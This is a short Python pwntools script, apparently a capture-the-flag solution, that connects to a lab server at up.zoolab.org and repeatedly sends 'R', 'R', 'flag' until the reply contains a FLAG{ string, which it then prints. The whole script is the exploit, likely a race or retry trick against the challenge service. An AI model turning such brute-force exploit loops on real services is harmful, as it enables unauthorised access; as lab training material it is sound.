
from pwn import *


if __name__ == "__main__":
    r = remote( 'up.zoolab.org', 10931)
    payload = """R
R
flag
"""
    recved = r.recvuntil("read it.".encode()).decode()
    while recved.find("FLAG{") == -1:
        r.sendline( payload.encode())
        recved = r.recv().decode()
        # print( recved)
    
    # r.interactive()
    r.close()

    print( recved[ recved.find("FLAG{"):-1])
